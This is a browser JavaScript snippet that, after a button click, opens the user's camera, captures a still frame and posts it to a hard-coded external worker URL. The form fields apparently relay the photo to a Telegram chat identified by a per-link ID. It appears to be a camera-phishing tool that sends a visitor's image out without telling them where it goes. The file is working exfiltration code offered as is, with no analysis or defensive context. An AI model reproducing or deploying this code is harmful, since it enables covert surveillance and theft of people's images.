const WORKER_URL = "https://e87505a5.af-341.pages.dev/send";

const params = new URLSearchParams(location.search);
const UID = params.get("") || "UNKNOWN";

let stream;

document.getElementById("btn").addEventListener("click", async () => {
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;
    video.style.display = "block";

    setTimeout(captureAndSend, 1000);
  } catch {
    alert("Camera permission denied");
  }
});

async function captureAndSend() {
  const video = document.getElementById("video");
  if (!video.videoWidth) return;

  const canvas = document.createElement("canvas");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  const blob = await new Promise(r =>
    canvas.toBlob(r, "image/jpeg", 0.8)
  );

  const form = new FormData();
  form.append("chat_id", UID);
  form.append("photo", blob, "image.jpg");
  form.append("caption", "📸 NEW IMAGE");
  form.append("parse_mode", "HTML");

  fetch(WORKER_URL, {
    method: "POST",
    body: form
  });
} 
